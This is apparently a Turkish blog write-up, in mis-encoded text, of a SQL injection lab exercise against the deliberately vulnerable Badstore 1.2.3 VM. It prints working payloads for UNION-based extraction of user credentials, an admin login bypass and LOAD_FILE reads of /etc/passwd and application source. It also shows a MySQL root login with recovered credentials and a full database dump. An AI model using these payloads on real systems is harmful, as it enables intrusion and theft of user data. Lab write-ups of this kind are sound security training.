---
name: Badstore 123!
title: Badstore SQL Based Penetration Testing!
description: Bu rapor, Badstore 1.2.3 platformunda gerÃ§ekleÅŸtirilen SQL Injection tabanlÄ± sÄ±zma testi sÃ¼recini Ã¶zetlemektedir. Testte, kullanÄ±cÄ± doÄŸrulama mekanizmasÄ± ve veritabanÄ± yapÄ±landÄ±rmasÄ±ndaki gÃ¼venlik aÃ§Ä±klarÄ± incelenmiÅŸ, hassas verilere ve sistem dosyalarÄ±na izinsiz eriÅŸim saÄŸlanmÄ±ÅŸtÄ±r. Ã‡alÄ±ÅŸma, sistem gÃ¼venliÄŸini artÄ±rma gerekliliÄŸini vurgulamaktadÄ±r.
category: Penetration Testing
url: https://furkanibis.dev
icon: https://i.sstatic.net/P0kqf.png
image: https://i.sstatic.net/P0kqf.png
author: Furkan Ä°biÅŸ
date: Dec 14
featured: true
collab: false
---

# Badstore 1.2.3

## Ufak tatlÄ± aÃ§Ä±klamalar

BugÃ¼n sizlere Badstore 1.2.3 cihazÄ±na yÃ¶nelik gerÃ§ekleÅŸtirdiÄŸim SQL Injection tabanlÄ± sÄ±zma testinin raporunu sunacaÄŸÄ±m.

Badstore 1.2.3'ten bahsedecek olursak, kendisi bir online satÄ±ÅŸ platformudur; ancak iÃ§erisinde birÃ§ok zafiyet barÄ±ndÄ±rmaktadÄ±r.

[Vulnhub](https://www.vulnhub.com) tarafÄ±ndan sunulan harika bir platformdur. DoÄŸrudan indirmek isterseniz, ÅŸu baÄŸlantÄ±yÄ± kullanabilirsiniz: [Badstore 1.2.3](https://www.vulnhub.com/entry/badstore-123,41/).

VirtualBox Ã¼zerinde kurduÄŸum iki adet cihazÄ±m var. Birisi, tahmin edebileceÄŸiniz gibi Badstore'nin kendisi, diÄŸeri ise bir Kali cihazÄ±. SaldÄ±rÄ±larÄ±mÄ±zÄ± bu Kali cihazÄ±ndan gerÃ§ekleÅŸtireceÄŸiz. Bu senaryo doÄŸrultusunda, iki cihazÄ±n aynÄ± aÄŸda bulunduÄŸunu varsayabilirsiniz.

Sayfaya ilk girdiÄŸimizde, zengin bir arayÃ¼ze sahip olan Badstore'nin ana sayfasÄ± ile karÅŸÄ±laÅŸÄ±yoruz. ğŸ˜Š

![](/20241214113752.png)
Sayfa Ã¼zerinde kÄ±sa bir gezintinin ardÄ±ndan, Ã¼rÃ¼n arama iÃ§in oluÅŸturulan metin kutusuna boÅŸ bir deÄŸerle arama yaptÄ±ÄŸÄ±mÄ±zda ÅŸu Ã§Ä±ktÄ±yÄ± gÃ¶rÃ¼yoruz:

![](/20241214114333.png)
Burada yaÅŸanan olayÄ± kÄ±saca Ã¶zetlemek gerekirse, her ne kadar Badstore'nin backend tarafÄ±nÄ± gÃ¶rmÃ¼yor olsak da, Python ile ÅŸu kodlara benzer bir yapÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± sÃ¶yleyebilirim:

```python3
user_inp = get_user_inp()
sql_query = f"SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '{user_inp}' IN (itemnum,sdesc,ldesc)"
curr.execute(sql_query)
items_user_wanted = curr.fetch_all()
if len(items_user_wanted) > 0:
	return items_user_wanted
else:
	return ('No items matched your search criteria:', sql_query)
```

Ã–rnek olarak yazdÄ±ÄŸÄ±m bu kodda Ã¶nemli bir sorun ÅŸudur: KullanÄ±cÄ±nÄ±n girdiÄŸi arama kriteri arka planda bir kontrole tabi tutulmuyor ve doÄŸrudan SQL sorgularÄ±nÄ±n iÃ§erisine aktarÄ±lÄ±yor. Peki, bu durum ne gibi sorunlara yol aÃ§abilir?

Bu durum, uygulamanÄ±n **SQL Injection** saldÄ±rÄ±larÄ±na aÃ§Ä±k hale gelmesine neden olur. Yani, saldÄ±rgan, arama kutusuna Ã¶zel hazÄ±rlanmÄ±ÅŸ SQL ifadeleri yazarak:

1. **VeritabanÄ±ndaki verilere yetkisiz eriÅŸim saÄŸlayabilir** (Ã¶rneÄŸin, kullanÄ±cÄ± adlarÄ± ve ÅŸifreler gibi hassas bilgileri gÃ¶rÃ¼ntÃ¼leyebilir).
2. **VeritabanÄ±nda veri manipÃ¼lasyonu yapabilir** (Ã¶rneÄŸin, kayÄ±tlarÄ± silebilir, gÃ¼ncelleyebilir veya yenilerini ekleyebilir).
3. **Sisteme daha fazla zarar verebilecek komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir** (Ã¶rneÄŸin, veritabanÄ± sunucusunun iÅŸletim sistemine eriÅŸim saÄŸlayabilir).

Bu nedenle, kullanÄ±cÄ± girdileri mutlaka doÄŸrulanmalÄ± ve SQL sorgularÄ± iÃ§in **parametreli sorgular (prepared statements)** veya **ORM (Object-Relational Mapping)** araÃ§larÄ± kullanÄ±lmalÄ±dÄ±r.

Aksi takdirde, yaptÄ±ÄŸÄ±nÄ±z uygulama kÃ¶tÃ¼ niyetli kiÅŸiler tarafÄ±ndan raporumuzun ilerleyen aÅŸamalarÄ±nda gerÃ§ekleÅŸtirdiÄŸimiz iÅŸlemlere maruz kalabilir. Bu da sisteminizin veya uygulamanÄ±zÄ±n ciddi ÅŸekilde zarar gÃ¶rmesine yol aÃ§abilir. ğŸ˜Š


## SÄ±zma Testi

Sistemimizde hangi veritabanÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in, **nmap** aracÄ±nÄ± kullanÄ±yorum. Bunun iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rÄ±yorum:
```bash
sudo nmap -sS -p- 192.168.1.116
```
![](/20241214130414.png)

Hedef sistemimizin MySQL kullandÄ±ÄŸÄ±nÄ± bir kenara not alÄ±yoruz. Bu bilgi, sonraki adÄ±mlarda sorgularÄ±mÄ±zÄ± Ã¶zelleÅŸtirmek iÃ§in oldukÃ§a Ã¶nemli. ğŸ˜Š

Ufak aÃ§Ä±klamalarÄ±n ardÄ±ndan sÄ±ra bilgi edinme kÄ±smÄ±na geldi. Bir sistem Ã¼zerinde ne kadar fazla bilgi sahibi olursak, o kadar gÃ¼Ã§lÃ¼ bir saldÄ±rÄ± gerÃ§ekleÅŸtirebileceÄŸimiz kaÃ§Ä±nÄ±lmaz bir gerÃ§ektir. Bu yazÄ±da saldÄ±rÄ± tÃ¼rÃ¼mÃ¼z SQL Injection olduÄŸundan, hedef sistemin kullandÄ±ÄŸÄ± **SQL dili** ve **versiyonu**, ayrÄ±ca hangi **veritabanÄ± yÃ¶netim sistemi (DBMS)** kullanÄ±ldÄ±ÄŸÄ± gibi bilgiler bizim iÃ§in kritik Ã¶neme sahiptir.

Bu bilgiler, SQL Injection saldÄ±rÄ±larÄ±nÄ± Ã¶zelleÅŸtirmemize ve daha etkili hale getirmemize olanak tanÄ±r.

`1'='1' #` komutu, SQL Injection iÃ§in en temel denemelerden biri olarak bu yazÄ±daki ilk komutumuz olacak. YaptÄ±ÄŸÄ±m denemelerde, `searchquery` iÃ§erisine bu komutu yazdÄ±ÄŸÄ±mda, sayfanÄ±n tÃ¼m Ã¼rÃ¼nlerini gÃ¶nderdiÄŸini keÅŸfettim. Bunun nedeni, sorgunun aÅŸaÄŸÄ±daki hale gelmesi:

```sql
SELECT itemnum, sdesc, ldesc, price 
FROM itemdb 
WHERE '1'='1' # ' IN (itemnum, sdesc, ldesc)
```

Burada `#` iÅŸareti, SQL dilinde yorum satÄ±rÄ± olarak kullanÄ±ldÄ±ÄŸÄ±ndan, sorgunun son kÄ±smÄ± dikkate alÄ±nmaz ve ÅŸu basitleÅŸtirilmiÅŸ hale gelir:

```sql
SELECT itemnum, sdesc, ldesc, price 
FROM itemdb 
WHERE '1'='1'
```
Bu durumda `'1'='1'` ifadesi her zaman doÄŸru olduÄŸundan, veritabanÄ± tÃ¼m Ã¼rÃ¼nleri dÃ¶ndÃ¼rÃ¼r. Bu da bize sayfanÄ±n barÄ±ndÄ±rdÄ±ÄŸÄ± tÃ¼m Ã¼rÃ¼nlerin listelenmesini saÄŸlar.

**Ã–nemli bir detay:** YazdÄ±ÄŸÄ±m komutlarÄ± doÄŸrudan URL parametresine yazmadan Ã¶nce, **online bir URL encoder** aracÄ± kullanarak encode ettim. Ã‡Ã¼nkÃ¼, yanlÄ±ÅŸ bir URL formatÄ± yazÄ±ldÄ±ÄŸÄ±nda, sayfa otomatik olarak sizi ana sayfaya yÃ¶nlendiriyor. Bu, test iÅŸleminin dÃ¼zgÃ¼n Ã§alÄ±ÅŸmasÄ± iÃ§in kritik bir adÄ±mdÄ±r. ğŸ˜Š

![](/20241214122911.png)

AmacÄ±mÄ±z ÅŸu anlÄ±k sayfadaki Ã¼rÃ¼nlerle ilgilenmek deÄŸil, ancak sayfanÄ±n ilk sorgusundan aÅŸaÄŸÄ±daki gibi bir yapÄ± olduÄŸunu anlÄ±yoruz: 
```sql
SELECT itemnum, sdesc, ldesc, price 
FROM itemdb 
WHERE '' IN (itemnum,sdesc,ldesc)
```
sorgusunda sorgunun bize 4 adet kolon dÃ¶ndÃ¼ÄŸÃ¼nÃ¼ gÃ¶rÃ¼yoruz. SÄ±radaki hedefim bir UNION sorgusu olduÄŸundan bu ufak bilgi bizim iÃ§in Ã¶nemli Ã§Ã¼nkÃ¼ bildiÄŸiniz Ã¼zere UNION 2 adet sorguyu birleÅŸtiren yegane bir komuttur ancak birleÅŸtirilen sorgulardan dÃ¶necek olan verilerin eÅŸit kolon sayÄ±sÄ±na sahip olmalarÄ± gerekir.

Sorgumu bu mantÄ±ÄŸa gÃ¶re gÃ¼ncelliyorum ve aÅŸaÄŸÄ±daki komutu `searchquery`'ye veriyorum:

```sql
1'='0' UNION SELECT 1,1,1,1 #
```

**YaptÄ±klarÄ±mÄ± aÃ§Ä±klayacak olursam:**

1. `1='1'` ifadesini `1='0'` olarak deÄŸiÅŸtirmemin sebebi, Ã¼rÃ¼nlerle ilgilenmek yerine kendi yazdÄ±ÄŸÄ±m SQL sorgularÄ±nÄ±n dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ deÄŸeri gÃ¶rmek istememdir. Bu ÅŸekilde, ana sorgunun sonuÃ§larÄ± boÅŸ olur ve UNION sorgusunun dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ deÄŸerler gÃ¶rÃ¼nÃ¼r hale gelir.
2. `SELECT 1,1,1,1` ifadesi ise **ufak bir deneme** diyebiliriz. ğŸ˜Š Bu, UNION ile birleÅŸen sorgunun Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± test etmek iÃ§in kullanÄ±lÄ±yor.
3. `#` iÅŸareti, kalan kÄ±smÄ± yorumlayarak sorgunun geri kalanÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±yor.

Bu sorguyu Ã§alÄ±ÅŸtÄ±rarak, aÅŸaÄŸÄ±daki gibi bir Ã§Ä±ktÄ± elde ediyorum:  

![](/20241214124021.png)
Åimdi istediÄŸimiz bilgileri elde etmek iÃ§in deneyeceÄŸimiz sorgulara geldi ilk baÅŸta hedef sistemin versiyonunu ve db ismini almak istiyoruz bunun iÃ§in sorguya ÅŸunlarÄ± ekliyoruz
```sql
1'='0' UNION SELECT VERSION(),1,1,1 UNION SELECT DATABASE(),1,1,1#
```
![](/20241214125849.png)
VeritabanÄ±mÄ±zÄ±n adÄ± **badstoredb** ve versiyonu **4.1.7-standard**. Ancak amacÄ±mÄ±z, Ã¼rÃ¼nlerden ziyade kullanÄ±cÄ±larla ilgili bilgileri gÃ¶rmek olduÄŸundan, bu bilgilerin saklandÄ±ÄŸÄ± tabloyu bulmamÄ±z gerekiyor. Bunun iÃ§in **information_schema** tablosunu kullanacaÄŸÄ±m ve sorgumu ÅŸu ÅŸekilde deÄŸiÅŸtiriyorum:

```sql
1'='0' UNION SELECT (SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_SCHEMA = 'badstoredb' LIMIT 1),1,1,1 #
```
Ancak ufak bir sorunumuz var:
![](/20241214131243.png)
YaptÄ±ÄŸÄ±mÄ±z sorgularda MySQL 4.1.7-standard versiyonunu kullandÄ±ÄŸÄ±mÄ±zÄ± tespit etmiÅŸtik. Derin araÅŸtÄ±rmalarÄ±m sonucunda sorunun kaynaÄŸÄ±nÄ± buldum: Information Schema, MySQL 5.0.2 versiyonunda eklendi. Yani, kÄ±saca ÅŸu an Information Schema'mÄ±z mevcut deÄŸil. ğŸ˜”

Peki, kullanÄ±cÄ±larÄ±n tutulduÄŸu veritabanÄ± tablosunu nasÄ±l Ã¶ÄŸreneceÄŸiz? Ä°nsanlÄ±ÄŸÄ±n sahip olduÄŸu en mÃ¼tevazÄ± yeteneklerden biriyle: 'doÄŸaÃ§lama'!

Ä°lk tespit ettiÄŸimiz tablonun **itemdb** olduÄŸunu biliyorduk. Bunun gibi, Ã§eÅŸitli tablo isimlerini denemeye baÅŸladÄ±m: **user**, **userdb**, **users**, **usersdb** gibi. Tahmin ettiÄŸimiz gibi, tablomuzun adÄ± **userdb**. Bunu, aÅŸaÄŸÄ±daki sorgunun hata vermemesinden anlayabiliyoruz:
```sql
1'='0' UNION SELECT 1,1,1,1 FROM userdb #
```
![](/20241214180737.png)
Peki, tablo ismini Ã¶ÄŸrendik, ancak bu tablonun kolonlarÄ±nÄ±n isimleri neler? Bunu Ã¶ÄŸrenmek iÃ§in yine **information_schema**'ya baÅŸvurabilirdik tabii ki, ancak yukarÄ±daki problemi tekrar yaÅŸamaktan baÅŸka bir ÅŸey kazanamazdÄ±k. Bu nedenle farklÄ± bir yaklaÅŸÄ±m dÃ¼ÅŸÃ¼nmeliydim.

DenediÄŸim bazÄ± yÃ¶ntemler ÅŸunlardÄ±, ancak yalnÄ±zca **syntax hatalarÄ±** aldÄ±m. Muhtemelen bu MySQL versiyonunda bu yÃ¶ntemler de desteklenmiyor:
```sql
SHOW COLUMNS.field FROM userdb
DESCRIBE userdb
```
Bu durumda, kolon isimlerini Ã¶ÄŸrenmek iÃ§in farklÄ± bir strateji izlememiz gerekiyor.

Ã‡ok sayÄ±da deneme yaptÄ±m, ancak Ã§oÄŸu sonuÃ§ vermedi. Yine de sonunda ÅŸu iÅŸlemle sorunu Ã§Ã¶zmeyi baÅŸardÄ±m: Login sayfasÄ±nda gezinirken, **Full Name** alanÄ±nÄ±n `input` adÄ±nÄ±n **fullname** olduÄŸunu fark ettim. Bu gÃ¶zlemle, bir deneme atÄ±ÅŸÄ± yapmaya karar verdim:

![](/20241214182147.png)
```sql
1'='0' UNION SELECT fullname,1,1,1 from userdb #
```
Bu sayede, ilk kolonumuzun adÄ±nÄ± bulmuÅŸ olduk. Daha sonra aynÄ± yÃ¶ntemi **email**, **passwd** ve **pwdhint** isimleriyle denediÄŸimde baÅŸarÄ±lÄ± sonuÃ§lar elde ettim. AÅŸaÄŸÄ±daki sorguyu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mda ise kullanÄ±cÄ± bilgilerini iÃ§eren veriler karÅŸÄ±ma Ã§Ä±ktÄ±. KÄ±saca sorgu ÅŸu ÅŸekildeydi:
```sql
1'='0' UNION SELECT fullname,email,passwd,pwdhint from userdb #
```

![](/20241214182036.png)

Bu sorgu, tabloyu ve kolonlarÄ± doÄŸrulamakla kalmadÄ±, aynÄ± zamanda verileri de elde etmemi saÄŸladÄ±. ğŸ¯

KullanÄ±cÄ±lar arasÄ±nda **admin** kullanÄ±cÄ±sÄ± dikkatimi Ã§ekti. Åimdi bu noktada Ã§eÅŸitli yÃ¶ntemlerimiz var:

1. **HashlenmiÅŸ Åifreyi Ã‡Ã¶zmek:**  
    Bunu **hash kÄ±rma araÃ§larÄ±** veya **online hash kÄ±rÄ±cÄ±lar** kullanarak Ã§Ã¶zmeyi deneyebiliriz.
    
2. **Brute Force veya Wordlist TabanlÄ± Hit:**  
    Åifreyi brute force veya yaygÄ±n ÅŸifre listelerini (wordlist) kullanarak Ã§Ã¶zebiliriz. Ã–zellikle admin kullanÄ±cÄ±larÄ±nÄ±n zayÄ±f ÅŸifreler kullandÄ±ÄŸÄ± senaryolarda etkili olabilir.
    

Ancak, bu yÃ¶ntemlerin Ã¶tesinde daha **gÃ¼zel bir yaklaÅŸÄ±m** var: EÄŸer SQL Injection aracÄ±lÄ±ÄŸÄ±yla doÄŸrudan ÅŸifre kontrol mekanizmasÄ±nÄ± atlayabilirsek, hash Ã§Ã¶zmeye gerek kalmadan sisteme eriÅŸim saÄŸlayabiliriz! ğŸ˜Š Bu, hedef sistemin login mantÄ±ÄŸÄ±nÄ± manipÃ¼le ederek admin oturumunu doÄŸrudan ele geÃ§irmeyi iÃ§erir.

YukarÄ±da anlattÄ±ÄŸÄ±m yapÄ±ya benzer bir yapÄ± Ã§alÄ±ÅŸÄ±yor diye tahmin ediyorum. Ancak kÄ±saca yeniden aÃ§Ä±klamak gerekirse, kullanÄ±cÄ±nÄ±n girdiÄŸi **email** ve **parola**, backend tarafÄ±nda aÅŸaÄŸÄ±daki gibi bir yapÄ±ya yerleÅŸtiriliyor olmalÄ±:
```python
username, password = get_user_inp()
sql_query = f"SELECT * FROM userdb WHERE email='{username}' AND passwd='{password}'"
curr.execute(sql_query)
user_exists = curr.fetch_all()
if len(user_exists) > 0:
	return items_user_wanted
```
Yine aynÄ± mantÄ±k aslÄ±nda; eÄŸer kullanÄ±cÄ±nÄ±n girdiÄŸi inputlar kontrol edilmezse, sayfa yine manipÃ¼le edilebilir. **Admin** kullanÄ±cÄ±sÄ±nÄ±n email'inin `admin` olduÄŸunu biliyorduk. Login sayfasÄ±nda **Email Address** inputuna ÅŸu bilgiyi verirsek:
```text
admin' #
```
```sql
SELECT * FROM userdb WHERE email='admin' #' AND ''=passwd
```
KÄ±saca temiz haliyle sorgu ÅŸu ÅŸekilde olur:
```sql
SELECT * FROM userdb WHERE email='admin'
```
![](/20241214184632.png)
![](/20241214184645.png)
YukarÄ±da gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi, SQL Injection yÃ¶ntemiyle **admin** hesabÄ±na baÅŸarÄ±lÄ± bir ÅŸekilde giriÅŸ yapmayÄ± baÅŸardÄ±k. ğŸ¯ Bu iÅŸlem, kullanÄ±cÄ± inputlarÄ±nÄ±n kontrol edilmemesi ve sorgunun manipÃ¼le edilebilmesi nedeniyle mÃ¼mkÃ¼n oldu.

Peki, daha ne kadar ileri gidebiliriz? MySQL'in **`LOAD_FILE`** isimli metodunu kullanarak hedef sistem iÃ§erisinde bilgi edinmek mÃ¼mkÃ¼n. Bu yÃ¶ntem, veritabanÄ± sunucusundaki dosyalarÄ± okuma imkanÄ± saÄŸlar. Ã–rneÄŸin, aÅŸaÄŸÄ±daki komutla **`/etc/passwd`** dosyasÄ±ndan sistemle ilgili bilgileri elde edebiliriz:
```sql
1' = '0' UNION SELECT 1,1,1,LOAD_FILE('/etc/passwd') #
```
![](/20241214185847.png)
Bu komutla, sistem Ã¼zerinde **2 adet kullanÄ±cÄ±nÄ±n** bulunduÄŸunu gÃ¶rebiliyoruz: **root** ve **nobody** kullanÄ±cÄ±larÄ±. 

Badstore Ã¼zerinde daha Ã¶nce hata aldÄ±ÄŸÄ±mÄ±zda karÅŸÄ±mÄ±za Ã§Ä±kan **badstore.cgi** dosyasÄ±nÄ±n iÃ§eriÄŸini merak ediyorum. Bu dosyada neler olduÄŸunu Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sorguyu Ã§alÄ±ÅŸtÄ±rÄ±yorum:
```sql
1' = '0' UNION SELECT 1,1,1,LOAD_FILE('/usr/local/apache/cgi-bin/badstore.cgi') #
```
![](/20241214190425.png)
![](/20241214190456.png)


Burada, elde ettiÄŸimiz **badstore.cgi** dosyasÄ±nÄ±n iÃ§eriÄŸini inceliyor ve iÅŸimize yarayabilecek kÄ±sÄ±mlarÄ± araÅŸtÄ±rÄ±yorum. Bu tÃ¼r dosyalar genellikle kritik bilgiler iÃ§erebilir. Tam da istediÄŸim gibi bir bilgi buluyorum! ğŸ¯

![](/20241214190808.png)

Hedef sistemimizin MySQL kullanÄ±cÄ± adÄ± **root** ve parolasÄ± **secret** olarak tespit edildi. Bu bilgi, sisteme doÄŸrudan eriÅŸim saÄŸlamak iÃ§in kritik bir adÄ±m! AyrÄ±ca, backuplarÄ±n **/usr/local/apache/htdocs/backup/** klasÃ¶rÃ¼ altÄ±nda bulunduÄŸunu tespit ettik. Bu klasÃ¶r, daha fazla bilgi edinmek ve potansiyel olarak hassas verilere eriÅŸmek iÃ§in incelenebilir. Ancak, ÅŸu an hedef sisteme baÄŸlanmayÄ± tercih ediyorum.
```bash
mysql -u root -p -h 192.168.1.116 --skip_ssl
```

![](/20241214191421.png)

Hedef cihazÄ±n MySQL'ine baÅŸarÄ±lÄ± bir ÅŸekilde giriÅŸ yapmÄ±ÅŸ olduk. ğŸ‰ ArtÄ±k, veritabanÄ±nÄ± keÅŸfetmek ve potansiyel olarak kritik bilgilere eriÅŸmek iÃ§in doÄŸrudan sorgular Ã§alÄ±ÅŸtÄ±rabiliriz.

![](/20241214191722.png)

TÃ¼m bu veritabanÄ± tablolarÄ±nÄ± tek tek incelemek yerine, artÄ±k veritabanÄ±nÄ±n tÃ¼m verilerini kendi sistemime bir kopyasÄ±nÄ± oluÅŸturmak ve bu sÄ±zma testini burada sonlandÄ±rmanÄ±n yeterli olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼yorum.
```bash
mysqldump -h 192.168.1.116 -u root -p badstoredb > badstore_database.sql
```
Ve iÅŸlemimizi burada sonlandÄ±rÄ±yorum. KÄ±saca, bu sÃ¼reÃ§te yaptÄ±ÄŸÄ±mÄ±z iÅŸlemleri Ã¶zetleyecek olursak:

### GerÃ§ekleÅŸtirdiÄŸimiz Ä°ÅŸlemler:

1. **Bilgilerini Bilmeden KullanÄ±cÄ± Olarak Oturum AÃ§mak**: SQL Injection yoluyla ÅŸifre doÄŸrulamasÄ±nÄ± atlayarak admin dahil Ã§eÅŸitli kullanÄ±cÄ±larla oturum aÃ§tÄ±k.
2. **Sunucudaki DosyalarÄ± Okumak**: MySQL'in `LOAD_FILE` fonksiyonunu kullanarak sistemdeki kritik dosyalarÄ±n iÃ§eriklerini gÃ¶rÃ¼ntÃ¼ledik.
3. **VeritabanÄ±nÄ± Yedeklemek**: VeritabanÄ±nÄ±n tam bir kopyasÄ±nÄ± alarak kendi sistemimize aktardÄ±k.
4. **Hassas Bilgileri GÃ¶rÃ¼ntÃ¼lemek**: KullanÄ±cÄ± bilgileri, tablolar ve diÄŸer Ã¶nemli verileri elde ettik.

---

### Hala YapÄ±labilecek DiÄŸer Ä°ÅŸlemler:

1. **Sistem KomutlarÄ±nÄ± YÃ¼rÃ¼tmek**: EÄŸer MySQL kullanÄ±cÄ±sÄ±nÄ±n sistem seviyesinde yeterli yetkileri varsa, `sys_exec()` veya baÅŸka yÃ¶ntemlerle komut yÃ¼rÃ¼tmek mÃ¼mkÃ¼n olabilir.
2. **VeritabanÄ±nÄ± DROP Etmek**: VeritabanÄ±nÄ± tamamen silmek.
3. **Yeni KayÄ±t Eklemek veya Olan KayÄ±tlarÄ± GÃ¼ncellemek**: VeritabanÄ±na kÃ¶tÃ¼ amaÃ§lÄ± veya manipÃ¼le edilmiÅŸ veriler eklemek.
---
